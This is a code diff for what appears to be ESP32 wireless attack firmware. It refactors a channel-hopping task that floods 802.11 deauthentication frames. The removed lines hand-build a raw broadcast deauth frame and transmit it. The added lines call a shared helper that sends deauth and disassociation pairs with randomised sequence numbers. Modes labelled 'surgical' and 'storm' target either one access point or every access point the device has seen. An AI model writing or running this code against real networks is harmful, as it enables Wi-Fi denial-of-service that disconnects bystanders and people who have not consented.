@@ -25,6 +25,7 @@
 #include "radio.h"
 #include "c5_cmd.h"
 #include "wifi_types.h"
+#include "wifi_deauth_frame.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <SD.h>
@@ -317,12 +318,11 @@ static void cb(void *buf, wifi_promiscuous_pkt_type_t type)
 
 static void hop_task(void *)
 {
-    uint8_t deauth[26] = {
-        0xC0, 0x00, 0x00, 0x00,
-        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
-        0,0,0,0,0,0, 0,0,0,0,0,0,
-        0x00, 0x00, 0x07, 0x00,
-    };
+    /* Shared deauth+disassoc pair builder with per-frame sequence numbers.
+     * Seeded from esp_random() so Triton's frames don't collide with the
+     * interactive deauth feature's seq space when both end up airborne
+     * during a session. */
+    uint16_t seq = (uint16_t)(esp_random() & 0x0FFF);
     uint32_t last_hunt = 0;
     uint32_t last_save = millis();
     while (s_alive) {
@@ -355,21 +355,18 @@ static void hop_task(void *)
         if (hunt_period > 0 && millis() - last_hunt > hunt_period) {
             last_hunt = millis();
             if (s_mode == TM_SURGICAL) {
-                /* Deauth only the selected target. */
-                memcpy(deauth + 10, s_target_bssid, 6);
-                memcpy(deauth + 16, s_target_bssid, 6);
+                /* Deauth only the selected target. Each call fires a
+                 * deauth + disassoc pair, so 8 iterations = 16 frames. */
                 int bursts = 8;
                 for (int k = 0; k < bursts && s_alive; ++k) {
-                    esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
+                    wifi_deauth_broadcast(s_target_bssid, &seq);
                     delay(5);
                 }
             } else if (s_bs_n > 0) {
                 int bursts = (s_mode == TM_STORM) ? 4 : 2;
                 for (int i = 0; i < s_bs_n && s_alive; ++i) {
-                    memcpy(deauth + 10, s_bs[i].bssid, 6);
-                    memcpy(deauth + 16, s_bs[i].bssid, 6);
                     for (int k = 0; k < bursts; ++k) {
-                        esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
+                        wifi_deauth_broadcast(s_bs[i].bssid, &seq);
                         delay(5);
                     }
                 }
